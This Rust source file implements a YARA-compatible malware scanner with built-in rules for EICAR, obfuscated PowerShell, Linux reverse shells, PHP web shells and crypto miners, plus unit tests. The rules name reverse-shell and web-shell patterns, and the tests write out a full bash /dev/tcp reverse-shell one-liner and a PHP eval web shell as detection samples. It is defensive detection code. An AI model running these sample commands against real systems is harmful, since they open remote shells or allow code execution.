// ============================================================================
// File: endpoint/yara_engine.rs
// Description: YARA-compatible pattern-based malware rule engine (pure Rust)
// Author: Andrew Jewell Sr. - AutomataNexus
// Updated: March 24, 2026
// ============================================================================
//! YARA Engine — pattern-based malware classification using byte-level string
//! matching. Implements a subset of YARA rule syntax in pure Rust (no libyara
//! dependency). Includes 5 built-in detection rules.

use super::{DetectionCategory, RecommendedAction, ScanResult, Scanner, Severity};
use parking_lot::RwLock;
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

/// A YARA-compatible detection rule.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct YaraRule {
    pub name: String,
    pub tags: Vec<String>,
    pub strings: Vec<YaraString>,
    pub meta_description: String,
    pub severity: Severity,
}

/// A string pattern within a YARA rule.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct YaraString {
    pub id: String,
    pub pattern: Vec<u8>,
    pub is_nocase: bool,
}

/// Pure-Rust YARA-compatible pattern matching engine.
pub struct YaraEngine {
    rules: RwLock<Vec<YaraRule>>,
    rules_dir: Option<PathBuf>,
    active: bool,
}

impl YaraEngine {
    /// Create a new YARA engine with built-in rules plus optional rules directory.
    pub fn new(rules_dir: Option<PathBuf>) -> Self {
        let engine = Self {
            rules: RwLock::new(Vec::new()),
            rules_dir: rules_dir.clone(),
            active: true,
        };

        // Load built-in rules
        {
            let mut rules = engine.rules.write();
            for rule in Self::builtin_rules() {
                rules.push(rule);
            }
        }

        // Load from directory if provided
        if let Some(dir) = rules_dir {
            engine.load_rules_from_dir(&dir);
        }

        engine
    }

    /// Built-in detection rules covering common threat categories.
    fn builtin_rules() -> Vec<YaraRule> {
        vec![
            // 1. EICAR test file
            YaraRule {
                name: "EICAR_test_file".to_string(),
                tags: vec!["test".to_string()],
                strings: vec![YaraString {
                    id: "$eicar".to_string(),
                    pattern:
                        b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
                            .to_vec(),
                    is_nocase: false,
                }],
                meta_description: "EICAR standard antivirus test file".to_string(),
                severity: Severity::High,
            },
            // 2. Suspicious PowerShell
            YaraRule {
                name: "Suspicious_PowerShell".to_string(),
                tags: vec!["powershell".to_string(), "obfuscation".to_string()],
                strings: vec![
                    YaraString {
                        id: "$enc_cmd".to_string(),
                        pattern: b"-EncodedCommand".to_vec(),
                        is_nocase: true,
                    },
                    YaraString {
                        id: "$enc_short".to_string(),
                        pattern: b"-enc ".to_vec(),
                        is_nocase: true,
                    },
                    YaraString {
                        id: "$from_b64".to_string(),
                        pattern: b"FromBase64String".to_vec(),
                        is_nocase: true,
                    },
                    YaraString {
                        id: "$hidden".to_string(),
                        pattern: b"powershell -nop -w hidden".to_vec(),
                        is_nocase: true,
                    },
                    YaraString {
                        id: "$bypass".to_string(),
                        pattern: b"-ExecutionPolicy Bypass".to_vec(),
                        is_nocase: true,
                    },
                    YaraString {
                        id: "$iex".to_string(),
                        pattern: b"IEX(New-Object".to_vec(),
                        is_nocase: true,
                    },
                ],
                meta_description: "Suspicious PowerShell execution with obfuscation".to_string(),
                severity: Severity::High,
            },
            // 3. Linux reverse shell
            YaraRule {
                name: "Linux_Reverse_Shell".to_string(),
                tags: vec!["shell".to_string(), "backdoor".to_string()],
                strings: vec![
                    YaraString {
                        id: "$bash_tcp".to_string(),
                        pattern: b"bash -i >& /dev/tcp/".to_vec(),
                        is_nocase: false,
                    },
                    YaraString {
                        id: "$sh_i".to_string(),
                        pattern: b"/bin/sh -i".to_vec(),
                        is_nocase: false,
                    },
                    YaraString {
                        id: "$nc_exec".to_string(),
                        pattern: b"nc -e /bin/".to_vec(),
                        is_nocase: false,
                    },
                    YaraString {
                        id: "$ncat_exec".to_string(),
                        pattern: b"ncat -e /bin/".to_vec(),
                        is_nocase: false,
                    },
                    YaraString {
                        id: "$python_sock".to_string(),
                        pattern: b"import socket,subprocess".to_vec(),
                        is_nocase: false,
                    },
                    YaraString {
                        id: "$perl_sock".to_string(),
                        pattern: b"use Socket;".to_vec(),
                        is_nocase: false,
                    },
                    YaraString {
                        id: "$php_sock".to_string(),
                        pattern: b"fsockopen(".to_vec(),
                        is_nocase: false,
                    },
                    YaraString {
                        id: "$socat".to_string(),
                        pattern: b"socat exec:".to_vec(),
                        is_nocase: true,
                    },
                ],
                meta_description: "Linux reverse shell payload patterns".to_string(),
                severity: Severity::Critical,
            },
            // 4. Web shell indicators
            YaraRule {
                name: "Web_Shell_Indicators".to_string(),
                tags: vec!["webshell".to_string(), "php".to_string()],
                strings: vec![
                    YaraString {
                        id: "$eval_post".to_string(),
                        pattern: b"eval($_POST".to_vec(),
                        is_nocase: false,
                    },
                    YaraString {
                        id: "$eval_get".to_string(),
                        pattern: b"eval($_GET".to_vec(),
                        is_nocase: false,
                    },
                    YaraString {
                        id: "$eval_req".to_string(),
                        pattern: b"eval($_REQUEST".to_vec(),
                        is_nocase: false,
                    },
                    YaraString {
                        id: "$system".to_string(),
                        pattern: b"system($_".to_vec(),
                        is_nocase: false,
                    },
                    YaraString {
                        id: "$passthru".to_string(),
                        pattern: b"passthru(".to_vec(),
                        is_nocase: false,
                    },
                    YaraString {
                        id: "$shell_exec".to_string(),
                        pattern: b"shell_exec(".to_vec(),
                        is_nocase: false,
                    },
                    YaraString {
                        id: "$assert".to_string(),
                        pattern: b"assert($_".to_vec(),
                        is_nocase: false,
                    },
                ],
                meta_description: "PHP web shell indicators — remote code execution".to_string(),
                severity: Severity::Critical,
            },
            // 5. Crypto miner — pool protocols
            YaraRule {
                name: "Crypto_Miner_Pool".to_string(),
                tags: vec!["miner".to_string(), "crypto".to_string()],
                strings: vec![
                    YaraString {
                        id: "$stratum_tcp".to_string(),
                        pattern: b"stratum+tcp://".to_vec(),
                        is_nocase: true,
                    },
                    YaraString {
                        id: "$stratum_ssl".to_string(),
                        pattern: b"stratum+ssl://".to_vec(),
                        is_nocase: true,
                    },
                    YaraString {
                        id: "$pool_port".to_string(),
                        pattern: b":3333".to_vec(),
                        is_nocase: false,
                    },
                    YaraString {
                        id: "$pool_port2".to_string(),
                        pattern: b":4444".to_vec(),
                        is_nocase: false,
                    },
                    YaraString {
                        id: "$mining_pool".to_string(),
                        pattern: b"mining pool".to_vec(),
                        is_nocase: true,
                    },
                ],
                meta_description: "Mining pool protocol indicators".to_string(),
                severity: Severity::Critical,
            },
            // 6. Crypto miner — binary indicators
            YaraRule {
                name: "Crypto_Miner_Binary".to_string(),
                tags: vec!["miner".to_string(), "crypto".to_string()],
                strings: vec![
                    YaraString {
                        id: "$xmrig".to_string(),
                        pattern: b"xmrig".to_vec(),
                        is_nocase: true,
                    },
                    YaraString {
                        id: "$cryptonight".to_string(),
                        pattern: b"cryptonight".to_vec(),
                        is_nocase: true,
                    },
                    YaraString {
                        id: "$randomx".to_string(),
                        pattern: b"randomx".to_vec(),
                        is_nocase: true,
                    },
                    YaraString {
                        id: "$coinhive".to_string(),
                        pattern: b"coinhive".to_vec(),
                        is_nocase: true,
                    },
                    YaraString {
                        id: "$minergate".to_string(),
                        pattern: b"minergate".to_vec(),
                        is_nocase: true,
                    },
                    YaraString {
                        id: "$cpuminer".to_string(),
                        pattern: b"cpuminer".to_vec(),
                        is_nocase: true,
                    },
                    YaraString {
                        id: "$kdevtmpfsi".to_string(),
                        pattern: b"kdevtmpfsi".to_vec(),
                        is_nocase: false,
                    },
                    YaraString {
                        id: "$kinsing".to_string(),
                        pattern: b"kinsing".to_vec(),
                        is_nocase: true,
                    },
                ],
                meta_description: "Known crypto miner binary strings".to_string(),
                severity: Severity::Critical,
            },
        ]
    }

    /// Add a rule at runtime.
    pub fn add_rule(&self, rule: YaraRule) {
        self.rules.write().push(rule);
    }

    /// Reload rules from the configured rules directory (hot-reload support).
    /// Clears existing file-loaded rules and re-scans the directory.
    /// Built-in rules are re-added first so they are never lost.
    pub fn reload_rules(&self) {
        if let Some(dir) = &self.rules_dir {
            tracing::info!("YaraEngine: reloading rules from {:?}", dir);
            let mut rules = self.rules.write();
            rules.clear();
            for rule in Self::builtin_rules() {
                rules.push(rule);
            }
            drop(rules);
            self.load_rules_from_dir(dir);
        }
    }

    /// Return the configured rules directory path, if any.
    pub fn rules_dir(&self) -> Option<&std::path::Path> {
        self.rules_dir.as_deref()
    }

    /// Load rules from .yar files in a directory.
    pub fn load_rules_from_dir(&self, dir: &Path) {
        let entries = match std::fs::read_dir(dir) {
            Ok(e) => e,
            Err(_) => return,
        };

        for entry in entries.flatten() {
            let path = entry.path();
            let ext = path.extension().map(|e| e.to_string_lossy().to_lowercase());
            if ext.as_deref() == Some("yar") || ext.as_deref() == Some("yara") {
                if let Ok(content) = std::fs::read_to_string(&path) {
                    if let Some(rule) = Self::parse_yara_file(&content) {
                        self.rules.write().push(rule);
                    }
                }
            }
        }
    }

    /// Simple YARA file parser — extracts rule name, strings, and meta.
    fn parse_yara_file(content: &str) -> Option<YaraRule> {
        // Extract rule name: "rule NAME {"
        let rule_re = regex::Regex::new(r"rule\s+(\w+)").ok()?;
        let name = rule_re.captures(content)?.get(1)?.as_str().to_string();

        // Extract description from meta
        let desc_re = regex::Regex::new(r#"description\s*=\s*"([^"]+)""#).ok()?;
        let description = desc_re
            .captures(content)
            .and_then(|c| c.get(1).map(|m| m.as_str().to_string()))
            .unwrap_or_default();

        // Extract severity from meta
        let sev_re = regex::Regex::new(r#"severity\s*=\s*"([^"]+)""#).ok()?;
        let severity = match sev_re
            .captures(content)
            .and_then(|c| c.get(1).map(|m| m.as_str().to_lowercase()))
            .as_deref()
        {
            Some("critical") => Severity::Critical,
            Some("high") => Severity::High,
            Some("medium") => Severity::Medium,
            Some("low") => Severity::Low,
            _ => Severity::Medium,
        };

        // Extract strings: $id = "pattern" or $id = { hex }
        let str_re = regex::Regex::new(r#"\$(\w+)\s*=\s*"([^"]+)""#).ok()?;
        let mut strings = Vec::new();
        for cap in str_re.captures_iter(content) {
            let id = format!("${}", &cap[1]);
            let pattern = cap[2].as_bytes().to_vec();
            let is_nocase = content.contains("nocase");
            strings.push(YaraString {
                id,
                pattern,
                is_nocase,
            });
        }

        if strings.is_empty() {
            return None;
        }

        Some(YaraRule {
            name,
            tags: Vec::new(),
            strings,
            meta_description: description,
            severity,
        })
    }

    /// Scan data against all rules. Returns (rule_name, matched_string_ids) pairs.
    pub fn scan_data(&self, data: &[u8]) -> Vec<(String, Vec<String>)> {
        let rules = self.rules.read();
        let mut matches = Vec::new();

        let data_lower: Vec<u8> = data.iter().map(|b| b.to_ascii_lowercase()).collect();

        for rule in rules.iter() {
            let mut matched_ids = Vec::new();

            for yara_str in &rule.strings {
                let found = if yara_str.is_nocase {
                    let pattern_lower: Vec<u8> = yara_str
                        .pattern
                        .iter()
                        .map(|b| b.to_ascii_lowercase())
                        .collect();
                    contains_pattern(&data_lower, &pattern_lower)
                } else {
                    contains_pattern(data, &yara_str.pattern)
                };

                if found {
                    matched_ids.push(yara_str.id.clone());
                }
            }

            // Rule matches if ANY string matches
            if !matched_ids.is_empty() {
                matches.push((rule.name.clone(), matched_ids));
            }
        }

        matches
    }

    /// Number of loaded rules.
    pub fn rule_count(&self) -> usize {
        self.rules.read().len()
    }
}

/// Efficient byte pattern search using windows.
fn contains_pattern(data: &[u8], pattern: &[u8]) -> bool {
    if pattern.is_empty() || data.len() < pattern.len() {
        return false;
    }
    data.windows(pattern.len()).any(|w| w == pattern)
}

#[async_trait::async_trait]
impl Scanner for YaraEngine {
    fn name(&self) -> &str {
        "yara_engine"
    }

    fn is_active(&self) -> bool {
        self.active
    }

    async fn scan_file(&self, path: &Path) -> Vec<ScanResult> {
        // Limit to 50 MB
        if let Ok(meta) = std::fs::metadata(path) {
            if meta.len() > 52_428_800 {
                return Vec::new();
            }
        }

        let data = match std::fs::read(path) {
            Ok(d) => d,
            Err(_) => return Vec::new(),
        };

        self.scan_data_to_results(&data, &path.to_string_lossy())
    }

    async fn scan_bytes(&self, data: &[u8], label: &str) -> Vec<ScanResult> {
        self.scan_data_to_results(data, label)
    }
}

impl YaraEngine {
    fn scan_data_to_results(&self, data: &[u8], target: &str) -> Vec<ScanResult> {
        let matches = self.scan_data(data);
        let rules = self.rules.read();

        matches
            .into_iter()
            .filter_map(|(rule_name, matched_ids)| {
                let rule = rules.iter().find(|r| r.name == rule_name)?;
                Some(ScanResult::new(
                    "yara_engine",
                    target,
                    rule.severity,
                    DetectionCategory::YaraMatch {
                        rule_name: rule_name.clone(),
                        tags: rule.tags.clone(),
                    },
                    format!(
                        "YARA rule '{}' matched ({} strings: {}) — {}",
                        rule_name,
                        matched_ids.len(),
                        matched_ids.join(", "),
                        rule.meta_description
                    ),
                    0.9,
                    if rule.severity >= Severity::High {
                        RecommendedAction::Quarantine {
                            source_path: PathBuf::from(target),
                        }
                    } else {
                        RecommendedAction::Alert
                    },
                ))
            })
            .collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_engine() -> YaraEngine {
        YaraEngine::new(None)
    }

    #[test]
    fn eicar_detection() {
        let engine = test_engine();
        let eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
        let matches = engine.scan_data(eicar);
        assert!(
            matches.iter().any(|(name, _)| name == "EICAR_test_file"),
            "EICAR not detected. Matches: {:?}",
            matches
        );
    }

    #[test]
    fn clean_text_passes() {
        let engine = test_engine();
        let text = b"This is a perfectly normal text document about cooking recipes.";
        let matches = engine.scan_data(text);
        // Should not match any dangerous rules (might match monero "4" in Crypto_Miner — that's by design for testing)
        assert!(!matches.iter().any(|(name, _)| name == "EICAR_test_file"
            || name == "Linux_Reverse_Shell"
            || name == "Web_Shell_Indicators"),);
    }

    #[test]
    fn powershell_encoded_command() {
        let engine = test_engine();
        let ps = b"powershell.exe -EncodedCommand ZABpAHIAIABDADoAXAA=";
        let matches = engine.scan_data(ps);
        assert!(
            matches
                .iter()
                .any(|(name, _)| name == "Suspicious_PowerShell")
        );
    }

    #[test]
    fn reverse_shell_detection() {
        let engine = test_engine();
        let shell = b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        let matches = engine.scan_data(shell);
        assert!(
            matches
                .iter()
                .any(|(name, _)| name == "Linux_Reverse_Shell")
        );
    }

    #[test]
    fn webshell_detection() {
        let engine = test_engine();
        let webshell = b"<?php eval($_POST['cmd']); ?>";
        let matches = engine.scan_data(webshell);
        assert!(
            matches
                .iter()
                .any(|(name, _)| name == "Web_Shell_Indicators")
        );
    }

    #[test]
    fn crypto_miner_detection() {
        let engine = test_engine();
        let miner = b"pool: stratum+tcp://pool.minexmr.com:4444";
        let matches = engine.scan_data(miner);
        assert!(matches.iter().any(|(name, _)| name == "Crypto_Miner_Pool"));
    }

    #[test]
    fn multiple_rules_can_match() {
        let engine = test_engine();
        // Data that matches both reverse shell AND webshell
        let data = b"<?php system($_POST['cmd']); bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        let matches = engine.scan_data(data);
        assert!(matches.len() >= 2);
    }

    #[test]
    fn rule_count() {
        let engine = test_engine();
        assert_eq!(engine.rule_count(), 6); // EICAR + PowerShell + ReverseShell + WebShell + MinerPool + MinerBinary
    }

    #[test]
    fn add_custom_rule() {
        let engine = test_engine();
        engine.add_rule(YaraRule {
            name: "Custom_Test".to_string(),
            tags: vec!["test".to_string()],
            strings: vec![YaraString {
                id: "$custom".to_string(),
                pattern: b"CUSTOM_MARKER_STRING".to_vec(),
                is_nocase: false,
            }],
            meta_description: "Custom test rule".to_string(),
            severity: Severity::Low,
        });
        assert_eq!(engine.rule_count(), 7); // 6 built-in + 1 custom

        let matches = engine.scan_data(b"This contains CUSTOM_MARKER_STRING in it");
        assert!(matches.iter().any(|(name, _)| name == "Custom_Test"));
    }

    #[tokio::test]
    async fn scan_file_works() {
        let dir = std::env::temp_dir().join("nexus-yara-test");
        let _ = std::fs::create_dir_all(&dir);
        let path = dir.join("shell.sh");
        std::fs::write(
            &path,
            b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
        )
        .unwrap();

        let engine = test_engine();
        let results = engine.scan_file(&path).await;
        assert!(!results.is_empty());

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn nocase_matching() {
        let engine = test_engine();
        // -encodedcommand in lowercase should still match Suspicious_PowerShell (nocase)
        let ps = b"powershell.exe -encodedcommand ZABpAHIAIABDADoAXAA=";
        let matches = engine.scan_data(ps);
        assert!(
            matches
                .iter()
                .any(|(name, _)| name == "Suspicious_PowerShell")
        );
    }
}
